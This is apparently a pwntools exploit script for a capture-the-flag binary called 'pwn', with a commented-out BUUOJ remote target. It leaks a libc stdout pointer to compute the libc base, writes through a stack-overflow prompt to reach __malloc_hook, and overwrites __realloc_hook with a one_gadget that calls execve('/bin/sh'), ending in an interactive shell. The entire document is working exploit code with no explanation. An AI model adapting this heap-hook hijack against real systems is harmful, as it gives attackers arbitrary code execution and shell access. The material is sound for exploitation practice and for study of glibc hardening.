from pwn import *

#context.log_level = 'debug'
io = process("./pwn")
#io = remote('node4.buuoj.cn', 29389)
elf = ELF("./pwn")
libc = elf.libc 

def debug():
	gdb.attach(io)
	pause()

payload = b'A'*22 + b'XX' + b'A'
io.sendafter(b'bro:', payload)
io.recvuntil(b'XX')
stdout = u64(io.recvuntil(b',', drop = True).ljust(8, b'\x00')) & 0xFFFFFFFFFFFFFF00
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
print("libc_base:", hex(libc_base))
#debug()

io.sendlineafter(b'stackoverflow: ', str(7088360).encode())
#print(io.recv())
sleep(0.01)
io.sendlineafter(b'stackoverflow: ', str(3145728).encode())
io.sendlineafter(b'ropchain: ', b'A')
#print(io.recv())
#debug()

malloc_hook = libc_base + libc.symbols['__malloc_hook']
io.sendafter(b'stackoverflow: ', p64(malloc_hook+8))
io.sendlineafter(b'ropchain: ', b'A')
for i in range(7):
	io.sendlineafter(b'ropchain: ', b'B')
#debug()

"""
0x45526 execve("/bin/sh", rsp+0x30, environ)
0x4557a execve("/bin/sh", rsp+0x30, environ)
0xf1651 execve("/bin/sh", rsp+0x40, environ)
0xf24cb execve("/bin/sh", rsp+0x60, environ)
"""
one_gadget = libc_base + 0xf1651
print("one_gadget:", hex(one_gadget))
payload  = p64(malloc_hook+8)
payload += p64(0)*5
payload += p64(0x0000001000000000)
payload += p64(0xffffffffffffffff)
payload += p64(0x000000000a000000)
payload += p64(libc_base+3946352)
payload += p64(0xffffffffffffffff)
payload += p64(0)
payload += p64(libc_base+3938720)
payload += p64(0)*3
payload += p64(0x00000000ffffffff)
payload += p64(0)*2
payload += p64(libc_base+3924992)
payload += p64(0)*38
payload += p64(libc_base+3923648)
payload += p64(0)
payload += p64(libc_base+558720)
payload += p64(one_gadget) # __realloc_hook
payload += p64(libc_base+libc.symbols['realloc']) # __malloc_hook
io.sendafter(b'stackoverflow: ', payload)
#debug()

io.interactive()
